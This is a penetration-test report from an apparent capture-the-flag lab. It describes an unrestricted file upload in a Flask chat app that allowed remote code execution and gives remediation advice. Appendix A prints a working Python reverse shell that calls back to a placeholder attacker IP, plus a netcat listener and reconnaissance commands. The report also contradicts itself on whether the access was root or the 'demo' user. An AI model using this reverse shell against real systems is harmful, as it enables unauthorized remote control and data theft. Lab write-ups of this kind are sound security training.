# Penetration Testing Report
## SpeedChat Web Application

---

## Document Information
- **Report Title:** Penetration Testing Report - SpeedChat Web Application
- **Date:** 30-09-2026
- **Target:** 10.49.156.222
- **Engagement Type:** Authorized Security Assessment (CTF)
- **Report Status:** Final

---

## Executive Summary

### Overview
During this penetration test, a CRITICAL remote code execution (RCE) vulnerability was discovered in the web application file upload functionality, where there is no restrictions for file upload. An unauthenticated attacker can upload python files that are automatically executed by the server, resulting in complete system compromise, with `ROOT` level privilege.

An attacker can leverage this vulnerability to execute arbitrary commands on the server as the `demo` user, read and modify all files, establish persistent access, and fully control the target system.

### Key Findings
- **Critical Vulnerabilities:** 1
  - RCE via file upload functionality

### Risk Rating
**Overall Risk Level: CRITICAL**

If an attacker can execute commands as root they can steal data, delete all files and directories and lock users out.

### Recommendation Summary
They should immediately disable python execution in the upload directory by changing Flask configuration to serve uploads as static files. Additionally, they can validate file uploads, or restrict file types.

---

## 1. Scope & Methodology

### Scope
**In Scope:**
- Target: 10.49.156.222:5000
- Port: 5000 (HTTP Web Application)
- Application: SpeedChat (Flask web app)

### Testing Methodology
**Tools Used:**
- nmap (port scanning & service identification)
- ffuf (directory enumeration)

**Testing Phases:**
1. Reconnaissance - network mapping and endpoint discovery
2. Vulnerability Identification - application testing
3. Exploitation - RCE delivery and command execution
4. Post-Exploitation - flag retrieval and documentation

---

## 2. Reconnaissance & Discovery

### Network Scanning
**Command:** `sudo nmap -sC -sV 10.49.156.222`

**Results:**
- Port 22: (SSH)
- Port 5000: (Flask web server)

### Web Application Enumeration
**Observations:**
- Identified upload functionality at: `/upload_profile_pic`
- File type restrictions: NONE (accepted .php, .phtml, .jpg)
- Upload directory: `/uploads/`

### Vulnerability Scanning
**Method:** Manual testing

**Findings:**
- Upload functionality
- can upload any file types

---

## 3. Vulnerability Details

### Vulnerability 1: Unrestricted File Upload with Code Execution
**Type:** Remote Code Execution

#### Description
The vulnerability is the upload functionality which doesn't validate what kinds of file gets uploaded. This leads to a remote code excution through upload functionality by which the attacker gains root level privilege in the backend system.

#### Technical Details
- **Affected Component:** `/upload_profile_pic`
- **Attack Vector:** HTTP POST to `/upload_profile_pic`
- **Authentication Required:** No
- **User Interaction:** No
- **File Types Executable:** Python files (.py)

#### CVSS v3.1 Score
**Score: [9.8] - CRITICAL**

#### Impact
- **Confidentiality:** - Read system files
- **Integrity:** - Modify source codes and other system files
- **Availability:** - They can break the system's intended functionality 

#### Proof of Concept (High-Level)
1. Visit the site at `http://10.49.156.222:5000`
2. Create a reverse shell in python
3. Setup a listener in netcat
4. Upload it in upload section in profile photo

#### Evidence of Exploitation
```bash
pwd
whoami
ls -l
cat flag.txt
```

---

## 4. Attack Chain / Timeline of Compromise

### Phase 1: Initial Reconnaissance (Minutes 0-5)
- `sudo nmap -sC -sV 10.49.156.222`
- `ffuf -u http://10.49.156.222:5000/FUZZ -w /usr/share/wordlists/dirb/SecLists/Discovery/Web-Content/common.txt`

### Phase 2: Vulnerability Identification (Minutes 6-8)
- Identified the upload functionality which doesn't validate file types
- Leads to RCE

### Phase 3: Initial Access / RCE (Minutes 9-25)
- Created a reverse shell script in python
- Setup a netcat listener and uploaded the script

### Phase 4: Flag Retrieval (Minutes 26-29)
- Did system reconnaissance to know what file exist and user privileges
- **Flag retrieved:** `REDACTED`

### Total Compromise Time: ~29 minutes

---

## 5. Impact Assessment

### Business Impact
They could steal user data like PII OR SPII, which can lead to loss of customer trust and financial impact.

### Technical Impact
- **Complete System Compromise:** YES - Attacker gains root-level access to the entire backend system
- **Data Confidentiality:** CRITICAL - Attacker can read user database, PII, authentication credentials, API keys, and all sensitive configuration files
- **System Integrity:** CRITICAL - Attacker can modify source code, system binaries, configuration files, and create backdoors for persistent access
- **Availability:** CRITICAL - Attacker can delete files, disable services, crash the application, or destroy the entire system

### Affected Assets
- User database (containing user accounts, PII, and authentication credentials)
- Configuration files (API keys, database credentials, secrets)
- Application source code (Flask application logic and business logic)
- System binaries and core services
- Session tokens and authentication mechanisms
- User messages and sensitive communications

---

## 6. Remediation Recommendations

### Priority 1: Critical (Immediate Action Required)

#### 1.1 Implement File Upload Validation
- **Action:** Implement server-side file type validation using magic bytes verification and image library validation (PIL/Pillow)
- **Timeline:** Within 24-48 hours
- **Details:** 
  - Use Python PIL library to verify uploaded files are actual image files, not disguised executables
  - Reject any file that doesn't pass image validation, regardless of extension
  - Implement whitelist of allowed MIME types (.jpg, .png, .gif only)

#### 1.2 Disable Python Execution in Upload Directory
- **Action:** Configure Flask to serve uploads as static files only, preventing code execution
- **Timeline:** Immediate (same deployment)
- **Implementation:** 
  - Set upload directory permissions to read-only (chmod 555)
  - Configure Flask to serve uploads through a download endpoint instead of direct file access
  - Disable Python interpreter access to the uploads directory at the OS level

---

### Priority 2: High (Short-term)

#### 2.1 Implement Authentication for Upload Functionality
- **Action:** Require user authentication before allowing file uploads
- **Timeline:** 1 week
- **Details:** Add login requirement to the upload endpoint to prevent anonymous file uploads

#### 2.2 Add File Size Limits
- **Action:** Implement maximum file size restrictions (e.g., 5MB for profile pictures)
- **Timeline:** 1 week
- **Details:** Prevent disk space exhaustion attacks and reduce attack surface

---

## 7. Lessons Learned & Observations

### What Worked Well
- Quickly identified the upload functionality as the primary attack surface
- Rapidly adapted from PHP reverse shell to Python reverse shell after recognizing Flask backend
- Successfully created and deployed Python reverse shell with socket-based communication
- Efficient exploitation once the vulnerability was understood

### Areas for Improvement
- Initial reconnaissance wasted time testing PHP payloads before confirming the backend technology
- Could have identified Flask framework faster through HTTP headers or nmap fingerprinting
- Manual testing could have been replaced with automated scanning tools earlier

### Tools Effectiveness
- **nmap:** Excellent for identifying Flask/Python backend through service fingerprinting
- **ffuf:** Directory enumeration was less effective; the vulnerability was in application logic, not misconfigured paths
- **Manual Testing:** Most effective for identifying application-level vulnerabilities like unrestricted uploads
- **netcat:** Essential for reverse shell communication and interactive access

---

## 8. Conclusion

The SpeedChat web application contains a CRITICAL remote code execution vulnerability through unrestricted file upload functionality that allows unauthenticated attackers to execute arbitrary Python code with root privileges. Combined with the lack of file type validation and Python execution in the upload directory, an attacker can compromise the entire system, steal user data, modify application logic, and establish persistent access within minutes.

Immediate implementation of server-side file validation, file type restrictions, and disabling code execution in the upload directory is essential to prevent system compromise. Authentication requirements for upload functionality should be implemented as a secondary control.

**Risk Level:** CRITICAL - Immediate action required

---

## Appendix A: Command Reference

### Reconnaissance
```bash
sudo nmap -sC -sV 10.49.156.222
ffuf -u http://10.49.156.222:5000/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

### Exploitation
```bash
# Create reverse shell
#!/usr/bin/python3
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("[ATTACKER_IP]", [PORT]))
sock_fd = s.fileno()
os.dup2(sock_fd, 0)
os.dup2(sock_fd, 1)
os.dup2(sock_fd, 2)
proc = subprocess.Popen("/bin/bash")
proc.wait()
```

```bash
# Listener
nc -lvnp 9001
```
```
# Commands executed
whoami
ls -l
cat flag.txt
```

---


**Report Prepared By:** Bishal Kumar Baishya<br>
**Date:** 30-09-2026<br>
**Classification:** Internal Use